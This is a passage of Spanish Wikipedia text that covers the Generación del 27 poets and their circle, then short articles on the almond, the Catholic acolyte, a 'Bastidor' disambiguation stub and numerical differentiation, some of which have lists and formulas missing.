corrientes de las que se sienten herederos. En cuanto a si existieron relaciones personales entre ellos, las hubo, incluso de profunda amistad al menos entre los que residieron en la misma zona y frecuentaron lugares como la Residencia de Estudiantes, donde entraron en contacto con las vanguardias artísticas y científicas, y el Centro de Estudios Históricos, donde asimilaron las tradiciones culturales hispánicas, así como en las redacciones de revistas como "La Gaceta Literaria", "Cruz y Raya", "Revista de Occidente", "Litoral", "Caballo Verde para la Poesía" y "Octubre" entre otras, lo cual les hace tener una conciencia colectiva unida por experiencias comunes y propias definidas al cabo por la positiva de la República y las negativas de la Guerra Civil y los exilios exterior e interior.

En consecuencia la crítica afirma que se trata más bien un "grupo generacional", una "constelación" o "promoción" de autores, pese a lo cual ha terminado admitiéndose la designación de Generación del 27, pese a existir otras propuestas como: "Generación Guillén-Lorca"; "Generación de 1925" (media aritmética de la fecha de publicación del primer libro de cada autor); "Generación de las Vanguardias"; "Generación de la amistad"; "Generación de la Dictadura"; "Generación de la República", etc.

Al grupo literario anterior, que sucedió a los modernistas y a la Generación del 98, se le caracterizaba por su clara orientación europeísta y su concepción del arte como un área separada de lo social y lo político; se lo denominó Novecentismo o Generación del 14. Y todos esos grupos anteriores vinieron a coincidir temporalmente con los movimientos artísticos llamados Vanguardias que se desarrollaron en Europa desde 1909 y que rompen tanto con la temática como con las técnicas expresivas del Romanticismo y Realismo. Los vanguardistas se sienten atraídos por los adelantos tecnológicos y sus posibilidades, dando lugar a la corriente del futurismo, otros exploran la realidad llevándola a su descomposición, como los cubistas; otros sustituyen la realidad por el mundo onírico, como los surrealistas… Esta coincidencia temporal, y las características del movimiento vanguardista, hizo que los integrantes del grupo novecentista, vean en ellos la apuesta por un arte producto de un acto lúdico y libre, fruto de la capacidad intelectual y expresiva del artista, que tanto les atrae.

Los rasgos fundamentales de este movimiento literario son dos: la expresión de lo subjetivo, por lo que se caracterizan por el uso de la metáfora; y la precisión conceptual, que pone de manifiesto la sólida formación intelectual de los integrantes de este grupo. Dados sus rasgos fundamentales, no puede extrañar que los géneros literarios más representativos de estos literatos sean la lírica y el ensayo, que se divulga fundamentalmente a través de periódicos y revistas especializadas (un ejemplo lo constituye la revista sevillana "Grecia" -fundada por Isaac del Vando-Villar y Adriano del Valle, que funcionó entre 1918-1920-, que en 1919 recibe las colaboraciones de los poetas ultraístas.). A pesar de ello hay algún que otro representante de la novela dentro del novecentismo, que opta por el subjetivismo y la renovación iniciada por la Generación del 98, manipulando las situaciones para poder expresar su opinión sobre los más diversos temas.

En esta situación de continua renovación y cambios sociales y políticos, empiezan a aparecer jóvenes escritores, poetas en su mayoría, con características propias difíciles de encuadrar en los grupos existentes, pero se van uniendo en algunos lugares clave: entran en contacto con la tradición literaria española a través del centro de estudios históricos y con las vanguardias artísticas y culturales a través de las actividades de la residencia de estudiantes.

Así mismo asisten a las redacciones de algunas publicaciones comunes como la "Revista de Occidente" dirigida por José Ortega y Gasset o "La Gaceta Literaria" (dirigida por Ernesto Giménez Caballero), pero también en otras más como: "Litoral" (Málaga, 1926, impresa por Manuel Altolaguirre y Emilio Prados); "Verso y Prosa" (que viene del "Suplemento Literario" del diario murciano "La Verdad" -1923 a 1925-, que mantenían el redactor José Ballester Nicolás y Juan Guerrero Ruiz. "Murcia", 1927, dirigida por Juan Guerrero Ruiz y Jorge Guillén); "Mediodía" (Sevilla); "Meseta" (de Valladolid); "Cruz y Raya" (dirigida por José Bergamín, Madrid, 1933); "Carmen" (creada por Gerardo Diego en Santander en el año 1927, que tenía un suplemento festivo llamado "Lola"); "Octubre" (revista dirigida por Rafael Alberti) y "Caballo Verde para la poesía" (Madrid, 1935. Dirigida por Pablo Neruda).

Pese a todo, este grupo se caracteriza porque cada uno de sus miembros posee una personalidad tan acusada que es capaz de transformar las influencias o lecciones de cualquier modelo en propia sustancia personalizada totalmente diferente a la de los demás integrantes del mismo. Por ello no se puede hablar ni de comunidad de estilo ni de escuela entre ellos. Por eso hay muchos autores que prefieren referirse a ellos como "grupo del 27".

Dentro de este grupo de literatos podemos destacar a los siguientes poetas: Jorge Guillén, Rafael Alberti, Federico García Lorca,
Pedro Salinas, Dámaso Alonso, Gerardo Diego, Luis Cernuda, Vicente Aleixandre, Manuel Altolaguirre, Juan José Domenchina y Emilio Prados; este grupo es tan cerrado y estrecho que el crítico José-Carlos Mainer se burló adjetivándolos como "generación SL" (sociedad limitada) para insistir precisamente en la inmovilidad canónica de este grupo de poetas. Por eso se ha ampliado sin cesar y hay autores que también incluyen a Miguel Hernández en la lista, como un epígono más bien perteneciente a la Primera generación de posguerra o se agrupó con ellos a miembros de otras generaciones con los que tenían afinidad, como diversos novelistas, ensayistas y dramaturgos (Max Aub, Fernando Villalón, José Moreno Villa o León Felipe). 

Por demás habría que tener en cuenta a los autores olvidados por la crítica, como ocurre con la mayoría de las doce mujeres de este grupo, diez de ellas compañeras de la Generación del 27 en el Lyceum Club Femenino y conocidas generalmente como "Las sinsombrero": Concha Méndez-Cuesta, poeta y escritora de teatro; María Teresa León, escritora; Ernestina de Champourcín, poeta; Rosa Chacel, poeta, novelista, ensayista, traductora…; Josefina de la Torre, poeta, novelista, cantante lírica y actriz; María Zambrano, filósofa y ensayista; Luisa Carnés, narradora social y feminista, y las artistas Margarita Gil Roësset, Margarita Manso, Maruja Mallo y Ángeles Santos, a las que hay que añadir a Remedios Varo Algo semejante cabe afirmar del Lyceum Club de Barcelona

Por otra parte hay que incluir también a otros artistas cuya trayectoria es más o menos afín o muy relacionada con la de los autores del 27, aunque por diversas circunstancias no estaban tan unidos al grupo: Juan Larrea, Mauricio Bacarisse, Juan José Domenchina, José María Hinojosa, José Bergamín (que más bien pertenece al Novecentismo o Generación del 14), Alejandro Casona o Juan Gil-Albert.

También podemos tener presente a la llamada, por parte de uno de sus integrantes (José López Rubio), como ‘’Otra generación del 27’’, que está formada por los humoristas discípulos del vanguardista Ramón Gómez de la Serna, entre los que podemos destacar: Enrique Jardiel Poncela, Edgar Neville, Miguel Mihura y Antonio de Lara, «Tono», que se convirtieron tras la contienda nacional en integrantes de la redacción de "La Codorniz".

Pero además hay que tener en cuenta que no toda la producción literaria del 27 está escrita en castellano; hubo autores que perteneciendo a esta generación escribieron en otros idiomas, como Salvador Dalí u Óscar Domínguez, que escribieron en francés, o en inglés como Felipe Alfau, y algunos escritores y artistas extranjeros que fueron importantes en este movimiento, como Pablo Neruda, Vicente Huidobro, Jorge Luis Borges o Francis Picabia.

Es por todo ello por lo que no tiene mucha consistencia la idea de considerar la Generación del 27 como un fenómeno estrictamente madrileño. De hecho se puede ver la existencia de otros núcleos creativos que se encontraban dispersos por todo el territorio nacional, aunque con una estrecha relación entre ellos. Así, los principales núcleos se localizaron en Sevilla (en torno a la revista "Mediodía"), Canarias (en torno a la "Gaceta de Arte") y en Málaga (en torno a la revista "Litoral"; sin que esto suponga que no hubiera también una importante actividad en Cantabria, Galicia, Cataluña y Valladolid.

Tampoco se puede perder de vista que algunos miembros del grupo se centraron en actividades artísticas diferentes de las estrictamente literarias, como Luis Buñuel, cineasta; K-Hito, caricaturista y animador; pintores surrealistas como Salvador Dalí o Remedios Varo; Maruja Mallo, pintora y escultora; Ángeles Santos Torroella, pintora y artista gráfica; Benjamín Palencia, Gregorio Prieto, Manuel Ángeles Ortiz, Ramón Gaya y Gabriel García Maroto todos ellos pintores, a las que hay que añadir además a las "Sinsombrero" Margarita Gil Roësset, Margarita Manso y Ángeles Santos; o Rodolfo Halffter y Jesús Bal y Gay, compositores y el último también musicólogo, los cuales pertenecieron al llamado Grupo de los Ocho, nombre con el que se suele denominar en música el correlato de la literaria Generación del 27 y estaba integrado por: el mentado Bal y Gay, los Halffter, que eran Ernesto y Rodolfo, Juan José Mantecón, Julián Bautista, Fernando Remacha, Rosa García Ascot, Salvador Bacarisse y Gustavo Pittaluga, no pudiendo dejar de nombrar a mússicos más o menos marginales como Gustavo Durán.

En Cataluña está el llamado "grupo catalán", que hizo su presentación en 1931 bajo el nombre de "Grupo de Artistas Catalanes Independientes" integrado por Roberto Gerhard, Baltasar Samper, Manuel Blancafort, Ricardo Lamote de Grignon, Eduardo Toldrá y Federico Mompou.

En otros ámbitos, como la arquitectura, cabe mencionar la llamada Generación del 25 de arquitectos. Aunque algunos autores han propuesto llamarla también generación del 27, para unirla a esta, se trata de dos grupos con claras diferencias entre sí. Según uno de los estudios más completos sobre estos arquitectos hasta la fecha ("Carlos Arniches y Martín Domínguez, arquitectos de la Generación del 25". Madrid: Mairea), formaban parte de ella Fernando García Mercadal, Juan de Zavala, Manuel Sánchez Arcas, Luis Lacasa, Rafael Bergamín (hermano del ensayista y poeta José Bergamín), Luis Blanco Soler, Miguel de los Santos, Agustín Aguirre, Casto Fernández Shaw, Eduardo Figueroa, Carlos Arniches Moltó y Martín Domínguez Esteban. Según dicho estudio Teodoro de Anasagasti es uno de los maestros de esa generación, clave para entender la esencia del grupo y lo que lo hace distinto, y Luis Gutiérrez Soto, más joven que el resto, no cumple los valores que dicha generación se impuso. Otros, como José de Aspiroz, José Borobio, Manuel Muñoz Casayús, Fernando Salvador, Vicente Eced, Bernardo Giner de los Ríos o Ramón Durán Reynals son considerados periféricos.

En realidad, la llamada generación del 27 fue un grupo poco homogéneo; habitualmente se les ha ordenado por parejas o en tríos. Así, por ejemplo






En los autores del 27 es muy significativa la tendencia al equilibrio, a la síntesis entre polos opuestos, incluso dentro de un mismo autor:

Entre una concepción romántica del arte (arrebato, inspiración) y una concepción clásica (esfuerzo riguroso, disciplina, perfección). Lorca decía que si era poeta «por la gracia de Dios (o del demonio)» no lo era menos «por la gracia de la técnica y del esfuerzo».

Entre la pureza estética y la autenticidad humana, entre la poesía pura (arte por el arte; deseo de belleza) y la poesía auténtica, humana, preocupada por los problemas del hombre (más habitual tras la guerra: Guillén, Aleixandre...).

Entre el arte para minorías y mayorías. Alternan el hermetismo y la claridad, lo culto y lo popular (Lorca, Alberti, Diego). Se advierte un paso del «yo» al «nosotros». «El poeta canta por todos», diría Aleixandre.

Entre lo universal y lo español, entre los influjos de la poesía europea del momento (surrealismo) y de la mejor poesía española de siempre. Sienten gran atracción por la poesía popular española: cancioneros, romanceros...

Entre tradición y renovación. Se sienten próximos a las vanguardias (Lorca, Alberti, Aleixandre y Cernuda poseen libros surrealistas; Gerardo Diego, creacionistas); próximos a la generación anterior (admiran a Juan Ramón Jiménez, Unamuno, los Machado, Rubén Darío...); admiran del XIX a Bécquer (Alberti: «Homenaje a Bécquer», Cernuda: «Donde habite el olvido», Jorge Guillén, un estudio en su "Lenguaje y poesía" (1962)...); sienten auténtico fervor por los clásicos: Manrique ("Jorge Manrique, tradición y originalidad" de Pedro Salinas), Garcilaso ("Égloga, elegía, oda" de Luis Cernuda; "La voz a ti debida", de Pedro Salinas), Juan de la Cruz (Cristo de San Juan de la Cruz de Salvador Dalí; "Poemas del amor oscuro" de Federico García Lorca), Luis de León, Francisco de Quevedo (Jorge Guillén) Lope de Vega (especialmente en Gerardo Diego, pero también Lorca representó tres obras suyas con su grupo de La Barraca, e hizo el papel de sombra en "El caballero de Olmedo"), Pedro Calderón de la Barca (se intenta volver a poner de moda su teatro alegórico escribiendo autos sacramentales: Rafael Alberti y su "El hombre deshabitado") y, sobre todos, Luis de Góngora ("Fábula de Equis y Zeda" de Gerardo Diego; "Poema del agua" de Manuel Altolaguirre; "Cal y canto" de Rafael Alberti; "Soledad insegura" de Federico García Lorca). Y se reviven clásicos olvidados como Francisco de Aldana (al que dedica Cernuda un estudio crítico y admiradas alusiones en sus poemas). Por otra parte, la aproximación a lo humano y a lo social por parte de poetas como Rafael Alberti y el chileno Pablo Neruda se realiza a través del concepto de la poesía impura que este último aclimata a través de su revista española "Caballo verde para la poesía" (1935) y la revista de Rafael Alberti "Octubre". Rafael Alberti y el "epígono del 27" Miguel Hernández escribirán numerosos poemas de combate durante la Guerra civil.


La mayoría de estos autores, principalmente líricos, entraron en contacto con la tradición literaria (Siglo de Oro, Romancero, cancioneros de Gil Vicente, poesía árabe) a través del Centro de Estudios Históricos dirigido por el padre de la filología española, Ramón Menéndez Pidal, y con las vanguardias a través de los viajes, la divulgación llevada a cabo por Ramón Gómez de la Serna y otros novecentistas y, sobre todo, las actividades y conferencias programadas por la Residencia de Estudiantes, institución inspirada en el krausismo de la Institución Libre de Enseñanza y dirigida por Alberto Jiménez Fraud, que organizaba conferencias científicas de importantes figuras españolas y del extranjero (Albert Einstein, Howard Carter, Louis de Broglie, Marie Curie, Le Corbusier, Keynes, Santiago Ramón y Cajal, por ejemplo) y de las estéticas de Vanguardia (Louis Aragon, Max Jacob), entre otras (Gilbert Keith Chesterton, Paul Valéry, Ígor Stravinski, Paul Claudel, Wolfgang Köhler, Herbert George Wells...), además de contar con un cineclub y un día dedicado a conciertos. Editaba además una revista, "Residencia" (1926-1934).

Integrantes de la generación del 27, por orden cronológico:

No se puede unificar la poesía de esta generación, ni en el caso particular de cada poeta que se integra en ella. Pero puede encontrarse en todos ellos una voluntad de renovación, una superación de los “ismos” que surgieron en épocas anteriores, lo que supuso una superación del espíritu iconoclasta y destructor que los caracterizaba. Lo cual no les impide romper con el academicismo, y presentar, en ciertos momentos, una cierta irracionalidad en el uso de sus metáforas e imágenes, lo que les permite mantener su marcado talante original e independiente, sin ataduras a nada.

Puede distinguirse diversas etapas en la poesía de este grupo, unos autores hablan de dos, mientras que otros se decantan por establecer tres:




Destacamos entre los autores:


Nació en Madrid, fue profesor de literatura en varias universidades. Influido por la obra de Juan Ramón Jiménez, cultiva la poesía pura. Al igual que Juan Ramón intenta entrar en la esencia oculta de las cosas, con una poesía intelectualizada, aparentemente sencilla, que utiliza como cauce el verso heptasílabo y el endecasílabo sin rimas. Su obra se diferencia en tres etapas:


Nació en Valladolid. Se exilió a los Estados Unidos y fue, como su amigo Pedro Salinas, con quien sostuvo un prolongado epistolario, profesor de literatura española. Regresó tras la muerte de Franco y obtuvo el premio Cervantes. Su singularidad reside en haberse mantenido fiel al ideal de poesía pura, y ofreció una visión optimista y serena del mundo, con lo que se constituye en la antítesis del pesimismo cosmológico de Vicente Aleixandre.

Toda su obra se agrupa bajo el título general de "Aire Nuestro", que integra cinco libros: "Cántico", "Clamor", "Homenaje", "...Y otros poemas" y "Final". Su lenguaje es muy elaborado, en busca de la máxima y concisión; prefiere el verso corto y el endecasílabo. Su obra es fruto de un riguroso proceso de selección (de la palabra), en el que se suprime lo accesorio mediante la elipsis para comunicar la idea o sentimiento esencial, quedando un verso a menudo entrecortado por los encabalgamientos.

Sus temas son la afirmación jubilosa del ser; la plenitud, el tiempo que pasa e invita a gozar de la vida; el azar y el caos, que producen inseguridad o sufrimiento.


Nació en Santander y desempeñó la cátedra de Literatura en un Instituto de Enseñanzas Medias de Soria. Recibió el premio Nacional de Literatura, junto con Rafael Alberti, y el de Cervantes. Su poesía se desarrolla paralelamente en dos vertientes: la tradicional y la vanguardista (casi siempre creacionista). A su vertiente creacionista se adscriben: "Imagen", "Manual de Espumas" y "Fábula de Equis y Zeda". De su estética tradicional destacamos: "Versos Humanos", "Soria" y "Alondra de Verdad", colección de sonetos, agrupación métrica que, al igual que la décima, domina. Los temas de esta segunda vertiente son: el amor, Dios, la música, la naturaleza, los toros, la forma, la iconografía, la belleza…


Nació en Madrid, dirigió la RAE. En él se fundieron tres vocaciones: la de poeta, la de lingüista y la de crítico literario, una de las figuras más importantes de la estilística. Entre sus libros sobre literatura destaca "La lengua poética de Góngora" y una serie de estudios admirables sobre líricos modernos (desde Bécquer hasta los escritores de su época) que constituyen "Poetas españoles contemporáneos". Editó las obras de Góngora y se consideró a sí mismo dentro del 27 solamente como crítico, y como poeta más bien dentro de la Primera generación de posguerra, en lo que él mismo llamó poesía desarraigada, pues la guerra de 1936 le hizo aborrecer la pureza propugnada por Juan Ramón Jiménez que en un principio había intentado reproducir con sus primeros intentos líricos. Junto con Vicente Aleixandre fue el único autor del 27 que quedó en España, ambos en un llamado exilio interior. Sus obras más importantes se sitúan en la posguerra, destacando "Hijos de la ira" (1944), libro muy influido por el Existencialismo y por la poesía bíblica de los "Salmos" penitenciales, cuyo paralelismo semántico imita por medio de un particular uso del verso libre y el versículo. Es uno de los libros fundacionales de la corriente poética de posguerra conocida como poesía desarraigada, junto con "Sombra del paraíso" de Vicente Aleixandre, publicado ese mismo año.


Sevillano, su amistad con Dámaso Alonso despertó su vocación poética. En 1935, su libro "La destrucción o el amor" obtiene el Premio Nacional de Literatura. Es elegido miembro de la RAE. Y en 1977 obtiene el premio Nobel.

La mayor parte de su producción sigue los pasos del Surrealismo y se constituye en el gran poeta internacional de esta estética; su visión es sombría, dramática, pesimista. Utiliza el versículo y la imagen visionaria en "Espadas como labios" y "La destrucción o el amor", etapa primera de su evolución que se define en solidaridad con la materia, con la naturaleza, con el cosmos. Evoluciona hacia una «poesía de comunicación», de solidaridad con el hombre, en consonancia con la tendencia social vigente en la lírica de los años 50. "Sombra del paraíso" (1944), inaugura junto con "Hijos de la ira" de Dámaso Alonso, también de ese año, la corriente de la poesía desarraigada de la posguerra. Con "Historia del corazón" inició una poesía solidaria. Y finaliza con su gran trilogía "de senectute": "Poemas de la consumación", "Diálogos del conocimiento" y "En gran noche", en que vuelve a un peculiar surrealismo, con profundas implicaciones filosóficas y dejes conceptistas.


Nació en Granada en 1898. Sus estudios de Letras y Derecho no le interesaron tanto como la música; fue amigo entrañable de Manuel de Falla, de quien luego se distanció. Se instaló en la Residencia de Estudiantes, donde convivió con numerosos artistas (Salvador Dalí y Luis Buñuel en especial). Tras vivir una temporada en Nueva York, regresa a España y en 1932 funda La Barraca, grupo teatral universitario con el que recorre España representando obras clásicas. Participa en ciertas actividades públicas de signo izquierdista y muere asesinado por los nacionalistas en Viznar (Granada). Su asesinato produjo gran conmoción mundial.

En la obra de Lorca se aúnan lo culto y lo popular, lo tradicional y lo vanguardista. Conocía los cancioneros tradicionales y la poesía oral del pueblo andaluz. Su poética afirma que hay tres tipos de poesía: la de la Musa (la de la inteligencia y la cultura, cuyo prototipo de poeta es Góngora); la del Ángel (la de la inspiración, cuyo poeta tipo es Bécquer) y la del Duende (que se funda en el dolor y el daño); las dos primeras vienen de fuera y la última de dentro: esta última es la suya. Por eso su tema era la frustración en dos vertientes, la ontológica y la social; y lo desarrolla en un rico estilo poético, con uno de los sistemas simbólicos más complejos y de imaginería más brillante de la literatura española, formado por elementos extraídos sobre todo de tres fuentes: la superstición popular, Shakespeare y la Biblia. Le obsesionan temas como la soledad o el destino trágico, y la lucha de los seres marginados (el homosexual, la mujer, el niño, el deforme, el viejo impotente, la solterona, la estéril, el gitano, el negro...) contra una sociedad opresiva basada en los convencionalismos. Su obra se separa en dos etapas, una neopopularista y otra en que se acerca al Surrealismo en que intenta congraciarse con su homosexualidad no asumida por medio del pansexualismo.

De la primera etapa destacan:


De la segunda destacan:



Del Puerto de Santa María (Cádiz). Con su familia se traslada a Madrid. Abandona el Bachillerato y se dedica a la pintura. Se afilió al partido comunista y tuvo una activa participación política en la guerra. Al acabar esta se exilió a Argentina. Restablecida la democracia vuelve, y le será concedido el Premio Cervantes.

Se funden lo popular y lo culto, lo escueto y lo barroco, lo tradicional y lo frenéticamente nuevo. Su libro más temprano, "Marinero en tierra", se inscribe en una línea del neopopularismo. Son canciones que evocan un paraíso perdido, que el poeta identifica con el Cádiz de su infancia, y el mar, las salinas, los momentos más jubilosos de la misma. Le siguen "El alba de alhelí" y "Cal y canto", del más difícil neogongorismo o culteranismo. En 1929 publica su obra maestra, "Sobre los ángeles", inducida por una profunda crisis de perdida de fe; es un libro en tres partes; las dos primeras son de inspiración becqueriana; la última utiliza ya un pleno surrealismo en que desata el versículo. Utiliza símbolos como los ángeles, los fantasmas y los duendes. Libros de su segunda época, destaca "El poeta en la calle", de literatura comprometida. Otras obras, ya en el exilio publicará "Baladas y canciones del Paraná".


Fue alumno de Pedro Salinas y profesor de varias universidades europeas y americanas. Reunió su obra poética bajo el título general de "La realidad y el deseo", colección de libros a la que pertenecen: "Perfil del aire", "Égloga, elegía, oda", "Los placeres prohibidos", "Donde habite el olvido", "Un río, un amor", y "Las nubes", ya en el exilio, "Desolación de la quimera". Es también importante su labor como crítico literario y ensayista, con los dos volúmenes de "Poesía y literatura", etcétera.

Su poesía rehúye el énfasis formal, los ritmos demasiado marcados, el estrofismo y la metáfora buscando lo indefinible, lo aéreo. Por eso rechaza formas tan impostadas como el soneto y la rima y, cuando utiliza alguna, es la asonante, que le ofrece más libertad. Se centra en la experiencia humana, pero ahuyenta lo más específico y propio, rehúye su yo para que el lector pueda identificarse con la experiencia del poeta más que con el poeta mismo. Canta el choque entre el deseo y la realidad, que deja al poeta solo el consuelo elegíaco del recuerdo o unos pocos instantes, que el llama "acordes", de oda o celebración del gozo intemporal.

Reconstruir la memoria viva de lo que se ha venido a llamar la Edad de Plata y en concreto la Generación del 27 exige leer una serie de libros de memorias escritos por diversos autores más o menos vinculados a esta promoción. "La arboleda perdida", de Rafael Alberti, por ejemplo. Es también el caso de Pablo Neruda, quien por entonces vino a Madrid y reforzó el grupo surrealista con algunas de sus contribuciones, en particular con la edición de su libro "Residencia en la tierra" I y II y que en sus dos libros de memorias, "Confieso que he vivido" y "Para hacer he nacido", dio testimonio y noticias sobre las actividades del grupo durante esos años y el exilio posterior, en particular sobre Lorca y Alberti. "Los encuentros", de Vicente Aleixandre, narra las primeras veces que vio a cada una de las figuras relevantes de la generación; "Mi último suspiro", de Luis Buñuel, publicado primitivamente en francés, incluye numerosas anécdotas sobre los poetas del 27; "Vida en claro. Autobiografía" (1944) de José Moreno Villa, "Historial de un libro", de Luis Cernuda, los epistolarios de cada autor, etc.

Las Sinsombrero es una iniciativa para rescatar la memoria de las mujeres miembro de la Generación del 27, así como de otras mujeres que con su obra, sus acciones y su valentía fueron y son fundamentales para entender la cultura y la historia de un país que nunca las reivindicó.




</doc>
<doc id="6446" url="https://es.wikipedia.org/wiki?curid=6446" title="Almendra">
Almendra

La almendra es el fruto del almendro ("Prunus dulcis"). Posee una película de color canela que la envuelve, además de una cáscara exterior que no es comestible y que representa un peso importante de la almendra y una piel verde que se va secando. Por ello la parte comestible de este fruto se reduce al 40 %.

El término castellano "almendra", aunque pueda parecer de origen árabe, nos llega directamente a través del latín, al igual que muchos otros términos castellanos que también empiezan por al- sin ser esta la habitual partícula arábiga. "Almendra" procede, pues, tras alguna disimilación, de la palabra latina "amyndăla", adaptación vulgar de "amygdăla": amígdala, la cual es un antiguo préstamo de alguna lengua oriental desconocida en el griego.

Existen una infinidad de variedades/cultivares que se dividen en dos grandes grupos: "cáscara blanda" y "cáscara dura". Entre las variedades más cultivadas están:

Las más corrientes en España son:



A través de un acuerdo entre el IRTA y A.N.A. las siguientes variedades de almendra han sido exportadas a Chile.


Cada 100 g de almendra común aportan un valor energético de 2423 kJ o 579 kcal, dividiéndose estos a su vez en carbohidratos (21,55 g) de los cuales 4,35 g son azúcares, grasas (49,93 g) de las cuales 3,802 g son saturadas, 31,551 g son monoinsaturadas, 12,329 g son poliinsaturadas y 0,015 g son ácidos grasos trans, proteínas (21,15 g), fibra (12,5 g) y agua (4,41 g). A su vez estos 100 g de producto aportan los siguientes minerales esenciales, calcio (269 mg), hierro (3,71 mg), magnesio (270 mg), fósforo (481 mg), potasio (733 mg), sodio (1 mg), zinc (3,12 mg), cobre (1,031 mg), manganeso (2,179 mg) y selenio (4,1 mcg).

Cada 100 g de almendra común aportan las siguientes vitaminas, B1 o tiamina (0,205 mg), B2 o riboflavina (1,138 mg), B3 o niacina (3,618 mg), B5 o ácido pantoténico (0,471 mg), B6 (0,137 mg), B9 o ácido fólico (44 mcg), colina (52,1 mg), caroteno (1 mcg), E o α-tocoferol (25,63 mg), tocoferol beta (0,23 mg), tocoferol gamma (0,64 mg), tocoferol delta (0,07 mg), luteína + zeaxantina (1 mcg) y A o retinol (2 IU). Para ver los valores con mayor detalle, se puede consultar la ficha que aparece en la página superior derecha de la página.

Hay que tener en cuenta que como todo fruto seco, las almendras son altamente alergénicas, motivo por el cual debe evitarse su consumo en caso de alergia.

En la repostería española, la almendra es muy utilizada como ingrediente en la elaboración de postres tradicionales, como los turrones, los mazapanes y las tartas (entre las que destaca la tarta de Santiago), además de los helados y dulces, o como aperitivo, asada o frita.

La almendra también puede ser consumida en la leche de almendra o horchata de almendra.

Para los adeptos del Veganismo, la leche de almendra resulta una gran opción en el aporte de proteínas, además de ser ligera y tener un sabor agradable levemente dulce. La leche de almendra es ideal para las etapas de crecimiento y adolescencia gracias a su aporte de potasio y calcio.

El consumo de almendra ayuda a reducir el colesterol sanguíneo total y el LDL.

El aceite de este fruto es utilizado como emoliente, y la esencia de almendras amargas, en perfumería, por su aroma. También tiene otros usos el almendruco, que es el fruto tierno e inmaduro.

Argentina es uno de los 50 principales países productores de almendras. Su producción durante el año 2013 fue de un total de 648 toneladas. En Argentina, como en el resto del mundo, la producción de almendra es muy variable de un año a otro, debido a las cambiantes condiciones meteorológicas.

La producción en España se concentra en las Comunidades del litoral mediterráneo: Cataluña, Comunidad Valenciana, Baleares (Mallorca), Región de Murcia y Andalucía; así como en algunas zonas del interior tales como Aragón y la zona más oriental de Castilla-La Mancha, fundamentalmente en la provincia de Albacete.

En el año 2009 la producción de almendra fue de 270.686 toneladas, siendo así el segundo productor mundial precedido por Estados Unidos con una producción de 1.162.200 toneladas. Del año 2010 al 2013 las cifras se redujeron gradualmente con 222.518 y 149.000 toneladas respectivamente. En 2014 las cifras de producción se incrementaron hasta 195.704 toneladas.

Estados Unidos fue en 2013 el mayor productor de almendras, con una cifra de producción de 1.814.372 toneladas.

La producción en Chile en el año 2013 fue de 28.560 toneladas.

México es uno de los 50 principales países productores de almendras. En el año 2013 su producción fue de 60.000 toneladas.

La almendra propiamente dicha ha dado lugar a denominaciones normativas y no normativas en idioma español para otros objetos:




</doc>
<doc id="6447" url="https://es.wikipedia.org/wiki?curid=6447" title="Acólito">
Acólito

El acólito (del griego ἀκόλουθος "akolouthos", «el que sigue» o «el que acompaña») es un ministerio de la Iglesia católica y la Iglesia anglicana, cuyo oficio es ayudar al diácono cuidando del servicio en el altar y ayudando al presbítero durante las celebraciones litúrgicas, especialmente la misa. 

Desde los primeros siglos de la Iglesia se acostumbró a dar el nombre de "acólitos" a aquellos jóvenes que aspirando al ministerio eclesiástico se dedicaban a acompañar y seguir a los obispos, tanto para servirles en clase de pajes, como para llevar y traer las cartas o epístolas que recíprocamente se escribían. También recogían antiguamente las ofrendas de los fieles que se bendecían durante la misa y acabada ésta se entregaban a los diáconos y presbíteros para su distribución.

Algunos autores, entre ellos el docto Tomasino, sostienen que en la iglesia griega jamás se conocieron los acólitos. Pero otros, con el P. Goar, defienden la opinión contraria apoyados en el testimonio de san Dionisio , san Ignacio mártir, de san Epifanio, en los concilios de Laodicea y Antioquía, en las novelas de Justiniano y en la autoridad de Focio y añade que los griegos modernos tienen hoy acólitos con el nombre de "ceroferarios". 

Todos, sin embargo, convienen en que la iglesia latina los tuvo, según hemos dicho, desde los primeros tiempos. En Roma se conocieron tres clases, a saber: 


El ministerio del acólito es reconocido por la colación o institución por parte del obispo, aunque este ministerio en la práctica se realiza normalmente por acólitos "extraoficiales", es decir, no instituidos. Normalmente se instituye como acólito a los candidatos a las sagradas órdenes del diaconado y del presbiterado, aunque el ministerio puede ser ejercido por laicos (la condición de clérigo se recibe con la ordenación de diácono). Según el código de derecho sólo podrán ser instituidos acolitos "varones laicos" aunque el ejercicio de ese ministerio no les da derecho a remuneración por parte de la Iglesia católica (cf. "CDC" 230).
Sus principales funciones concretas son:

De acuerdo con el Código de Derecho canónico, los candidatos al sacerdocio deben ser instituidos acólitos con, al menos seis meses de antelación a la ordenación diaconal.
Tiene funciones equivalentes al acólito el Ministro extraordinario de la Sagrada Comunión.

Aunque el término acólito se usa también para referirse a quienes ayudan en el altar sin haber sido instituidos, las expresiones "monaguillo" o "servidor del altar" son más precisas, para evitar confusiones. Es habitual que el ministerio del altar sea ejercido por niños, llamados en este caso monaguillos, con la única diferencia de que éstos no pueden dar la comunión, por su edad. El hecho de que sea lo habitual no significa que sea un ministerio para niños, sino que puede ejercerlo sin institución cualquier cristiano que ha recibido la primera comunión. La institución del ministerio es única y exclusivamente para los varones, como se estipuló en el año 1755 por el Papa Benedicto XIV

La palabra monaguillo proviene de monjes pequeños, en Italia son conocidos como "chierichetti" o pequeños clérigos, en catalán "escolans" y en Alemania "ministrantes". Se prefiere la palabra acólito, reservando el vocablo "monaguillo" para los ministros extraordinarios o de hecho, es decir que no han sido nombrados solemnemente y no pertenecen a un "colegio" de acólitos o que ejercen estas funciones de forma esporádica.

Los monaguillos son “acólitos de hecho”, que sin haber sido instituidos en el ministerio de acólitos, lo ejercen más o menos establemente en las celebraciones comunitarias.

Las funciones que estos monaguillos pueden desempeñar son: 


</doc>
<doc id="6449" url="https://es.wikipedia.org/wiki?curid=6449" title="Bastidor">
Bastidor

Bastidor puede refererirse a:



</doc>
<doc id="6451" url="https://es.wikipedia.org/wiki?curid=6451" title="Derivación numérica">
Derivación numérica

La derivación numérica es una técnica de análisis numérico para calcular una aproximación a la derivada de una función en un punto utilizando los valores y propiedades de la misma.

Por definición la derivada de una función formula_1 es:

Las aproximaciones numéricas que podamos hacer (para h > 0) serán:

La aproximación de la derivada por este método entrega resultados aceptables con un determinado error. Para minimizar los errores se estima que el promedio de ambas entrega la mejor aproximación numérica al problema dado:



</doc>
<doc id="6465" url="https://es.wikipedia.org/wiki?curid=6465" title="Parque nacional de la Caldera de Taburiente">
Parque nacional de la Caldera de Taburiente

